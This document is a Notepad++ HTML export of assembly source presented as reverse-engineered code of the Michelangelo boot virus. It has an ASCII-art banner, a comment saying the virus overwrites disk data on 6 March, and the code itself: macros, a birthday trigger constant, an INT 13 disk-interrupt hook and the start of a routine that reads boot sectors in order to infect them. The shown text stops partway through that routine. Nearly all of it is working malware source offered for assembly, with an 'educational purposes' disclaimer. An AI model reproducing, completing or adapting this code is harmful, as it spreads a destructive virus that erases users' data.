<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">        </span><span class="sc9">TITLE</span><span class="sc0">   </span><span class="sc5">MICHELANGELO</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">STONED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">derived</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc9">SUBTTL</span><span class="sc0">  </span><span class="sc5">reverse</span><span class="sc0"> </span><span class="sc5">engineered</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">MASM</span><span class="sc0"> </span><span class="sc2">5.1</span><span class="sc4">/</span><span class="sc2">6.0</span><span class="sc0">

         </span><span class="sc9">PAGE</span><span class="sc0">   </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
        </span><span class="sc9">.RADIX</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">

    </span><span class="sc9">IF1</span><span class="sc0">
         </span><span class="sc9">%Out</span><span class="sc0">    ÉÍ </span><span class="sc5">VIRAL</span><span class="sc0"> </span><span class="sc5">SOFTWARE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DO</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">DISTRIBUTE</span><span class="sc0"> </span><span class="sc5">WITHOUT</span><span class="sc0"> </span><span class="sc5">NOTIFICATION</span><span class="sc0"> Í»
         </span><span class="sc9">%Out</span><span class="sc0">    º°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°º
         </span><span class="sc9">%Out</span><span class="sc0">    º°°°°°°°°°°°°°°°ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿°°°°°°°°°°°°°°°°º
         </span><span class="sc9">%Out</span><span class="sc0">    º°°ÄÄÄÄÄÄÄÄÄÄÄÄÄ´ </span><span class="sc5">M</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">H</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0"> </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">N</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0"> </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc0"> ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ°°º
         </span><span class="sc9">%Out</span><span class="sc0">    º°°°°°°°°°°°°°°°ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°°°°°°°°°°°°°°°º
         </span><span class="sc9">%Out</span><span class="sc0">    º°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°º
         </span><span class="sc9">%Out</span><span class="sc0">    ÈÍÍ </span><span class="sc5">Layout</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">C</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc2">1992</span><span class="sc0"> </span><span class="sc2">164A12565AA18213165556D3125C4B962712</span><span class="sc0"> ÍÍ¼
    </span><span class="sc9">ENDIF</span><span class="sc0">
    
        </span><span class="sc9">comment</span><span class="sc0"> #

  !                                      !
  !     </span><span class="sc5">MICHELANGELO</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc5">Ludovico</span><span class="sc0"> </span><span class="sc5">Buonarroti</span><span class="sc0"> </span><span class="sc5">Simoni</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">born</span><span class="sc0"> </span><span class="sc5">March</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1475</span><span class="sc4">,</span><span class="sc0">      !
  !     </span><span class="sc5">Caprese</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Republic</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Florence</span><span class="sc0"> </span><span class="sc5">...</span><span class="sc0">                                    !
  !     </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">block</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">overwrite</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">   !
  !     </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">eiter</span><span class="sc0"> </span><span class="sc5">floppy</span><span class="sc0"> </span><span class="sc5">disks</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">winchester</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">HIS</span><span class="sc0"> </span><span class="sc5">birthday.</span><span class="sc0">     !
  !                                                                      !
  ! </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">may</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">educational</span><span class="sc0"> </span><span class="sc5">purposes</span><span class="sc0">!          !
  !                                                                      !
  ! </span><span class="sc5">Do</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">offend</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">law</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">distributing</span><span class="sc0"> </span><span class="sc5">viral</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">trojan</span><span class="sc0"> </span><span class="sc5">horse</span><span class="sc0"> </span><span class="sc5">soft</span><span class="sc4">-</span><span class="sc0">    !
  ! </span><span class="sc5">ware</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">anybody</span><span class="sc0"> </span><span class="sc5">who</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">aware</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">potential</span><span class="sc0"> </span><span class="sc5">danger</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">      !
  ! </span><span class="sc5">software</span><span class="sc0"> </span><span class="sc5">he</span><span class="sc0"> </span><span class="sc5">receives.</span><span class="sc0">                                                !
  !                                                                          !

        #

        </span><span class="sc5">B</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">BYTE</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">D</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">DWORD</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">O</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">OFFSET</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">P</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">PTR</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">S</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">SHORT</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">T</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">THIS</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">v</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc6">OR</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">W</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">WORD</span><span class="sc4">&gt;</span><span class="sc0">


  </span><span class="sc5">SAVE</span><span class="sc0">          </span><span class="sc9">MACRO</span><span class="sc0">     </span><span class="sc5">_1</span><span class="sc4">,</span><span class="sc5">_2</span><span class="sc4">,</span><span class="sc5">_3</span><span class="sc4">,</span><span class="sc5">_4</span><span class="sc4">,</span><span class="sc5">_5</span><span class="sc4">,</span><span class="sc5">_6</span><span class="sc4">,</span><span class="sc5">_7</span><span class="sc4">,</span><span class="sc5">_8</span><span class="sc4">,</span><span class="sc5">_9</span><span class="sc4">,</span><span class="sc5">_a</span><span class="sc4">,</span><span class="sc5">_b</span><span class="sc4">,</span><span class="sc5">_c</span><span class="sc0">
                 </span><span class="sc9">IRP</span><span class="sc0">  </span><span class="sc5">_X</span><span class="sc4">,&lt;</span><span class="sc5">_1</span><span class="sc4">,</span><span class="sc5">_2</span><span class="sc4">,</span><span class="sc5">_3</span><span class="sc4">,</span><span class="sc5">_4</span><span class="sc4">,</span><span class="sc5">_5</span><span class="sc4">,</span><span class="sc5">_6</span><span class="sc4">,</span><span class="sc5">_7</span><span class="sc4">,</span><span class="sc5">_8</span><span class="sc4">,</span><span class="sc5">_9</span><span class="sc4">,</span><span class="sc5">_a</span><span class="sc4">,</span><span class="sc5">_b</span><span class="sc4">,</span><span class="sc5">_c</span><span class="sc4">&gt;</span><span class="sc0">
                  </span><span class="sc9">IFNB</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">_X</span><span class="sc4">&gt;</span><span class="sc0">
                   </span><span class="sc9">IFIDN</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_X</span><span class="sc4">&gt;,&lt;</span><span class="sc5">F</span><span class="sc4">&gt;</span><span class="sc0">
                    </span><span class="sc6">PUSHF</span><span class="sc0">
                   </span><span class="sc9">ELSE</span><span class="sc0">
                    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">_X</span><span class="sc0">
                   </span><span class="sc9">ENDIF</span><span class="sc0">
                  </span><span class="sc9">ENDIF</span><span class="sc0">
                 </span><span class="sc9">ENDM</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">

  </span><span class="sc9">REST</span><span class="sc0">          </span><span class="sc9">MACRO</span><span class="sc0">     </span><span class="sc5">_1</span><span class="sc4">,</span><span class="sc5">_2</span><span class="sc4">,</span><span class="sc5">_3</span><span class="sc4">,</span><span class="sc5">_4</span><span class="sc4">,</span><span class="sc5">_5</span><span class="sc4">,</span><span class="sc5">_6</span><span class="sc4">,</span><span class="sc5">_7</span><span class="sc4">,</span><span class="sc5">_8</span><span class="sc4">,</span><span class="sc5">_9</span><span class="sc4">,</span><span class="sc5">_a</span><span class="sc4">,</span><span class="sc5">_b</span><span class="sc4">,</span><span class="sc5">_c</span><span class="sc0">
                 </span><span class="sc9">IRP</span><span class="sc0">  </span><span class="sc5">_X</span><span class="sc4">,&lt;</span><span class="sc5">_1</span><span class="sc4">,</span><span class="sc5">_2</span><span class="sc4">,</span><span class="sc5">_3</span><span class="sc4">,</span><span class="sc5">_4</span><span class="sc4">,</span><span class="sc5">_5</span><span class="sc4">,</span><span class="sc5">_6</span><span class="sc4">,</span><span class="sc5">_7</span><span class="sc4">,</span><span class="sc5">_8</span><span class="sc4">,</span><span class="sc5">_9</span><span class="sc4">,</span><span class="sc5">_a</span><span class="sc4">,</span><span class="sc5">_b</span><span class="sc4">,</span><span class="sc5">_c</span><span class="sc4">&gt;</span><span class="sc0">
                  </span><span class="sc9">IFNB</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">_X</span><span class="sc4">&gt;</span><span class="sc0">
                   </span><span class="sc9">IFIDN</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_X</span><span class="sc4">&gt;,&lt;</span><span class="sc5">F</span><span class="sc4">&gt;</span><span class="sc0">
                     </span><span class="sc6">POPF</span><span class="sc0">
                   </span><span class="sc9">ELSE</span><span class="sc0">
                     </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">_X</span><span class="sc0">
                   </span><span class="sc9">ENDIF</span><span class="sc0">
                  </span><span class="sc9">ENDIF</span><span class="sc0">
                 </span><span class="sc9">ENDM</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">

  </span><span class="sc5">MOV_S</span><span class="sc0">         </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">S1</span><span class="sc4">,</span><span class="sc5">S2</span><span class="sc0">
                 </span><span class="sc5">SAVE</span><span class="sc0">   </span><span class="sc5">S2</span><span class="sc0">
                 </span><span class="sc9">REST</span><span class="sc0">   </span><span class="sc5">S1</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">TEXT</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc5">MICHELANGELO</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0306</span><span class="sc0">                    </span><span class="sc1">; ... his BCD birthday</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">SECSIZE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0200</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">WINCHESTER1</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">80</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">bREAD</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">wREAD</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">bREAD</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">bWRITE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">wWRITE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">bWRITE</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">DTA</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SECSIZE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">OR13OFF</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04C</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">OR13SEG</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04E</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">SYSRAM</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">413</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">MOSTAT</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">43F</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">PARTTBL</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1BE</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">OFSFRM0</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">7C00</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">JMP</span><span class="sc0">       </span><span class="sc5">INIT</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SHDWRELOCOFS</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OFSFRM0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RELOCOFS</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">FRSTRLCTD</span><span class="sc0">               </span><span class="sc1">; Used by an indirect far jmp</span><span class="sc0">
</span><span class="sc5">SHDWRELOCSEG</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OFSFRM0</span><span class="sc0">           </span><span class="sc1">;   to the relocated code.</span><span class="sc0">
</span><span class="sc5">RELOCSEG</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">HEADS</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CYLSEG</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SHDW13OFS</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OFSFRM0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">BIOS13OFS</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Holds original (BIOS)</span><span class="sc0">
</span><span class="sc5">SHDW13SEG</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">T</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OFSFRM0</span><span class="sc0">           </span><span class="sc1">;   int 13 vector.</span><span class="sc0">
</span><span class="sc5">BIOS13SEG</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">I13_ISR</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; INT 13 SR, save regs</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">                   </span><span class="sc1">; drive == A ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">I13_EX</span><span class="sc0">                  </span><span class="sc1">;   jmp if not</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; DS = 0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MOSTAT</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">         </span><span class="sc1">; test diskette motor status:</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">I13_EX</span><span class="sc0">                  </span><span class="sc1">;   jmp if motor is already on</span><span class="sc0">
                </span><span class="sc9">REST</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">; call old interrupt 13</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;  routine</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">; save FLAGS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TstInfF</span><span class="sc0">                 </span><span class="sc1">; test &amp; infect if necessary</span><span class="sc0">
                </span><span class="sc9">REST</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">; restore FLAGS</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; return, preserve FLAGS</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">I13_EX</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">REST</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   </span><span class="sc1">; restore regs, jmp to old int</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;   13h routine</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TstInfF</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">MOV_S</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                   </span><span class="sc1">; ES = DS = CS;</span><span class="sc0">
                </span><span class="sc5">MOV_S</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">                 </span><span class="sc1">; SI = 4 (maxretry counter)</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wREAD</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; AX : read one sector</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">                </span><span class="sc1">; BX : ... to buffer at CS:200</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">                 </span><span class="sc1">; CX : ... cylinder 0, sector 1</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; DX : ... drive 0, head 0</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">; call old int13 routine by</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;   simulating an interrupt</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">; jmp if there isn't an error,</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; else reset disk system ...</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; decrement maxretry counter</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc10">@B</span><span class="sc0">                      </span><span class="sc1">; try it again if not zero,</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">S</span><span class="sc0"> </span><span class="sc5">TstInfF_EX</span><span class="sc0">            </span><span class="sc1">; else jmp to exit in haste.</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
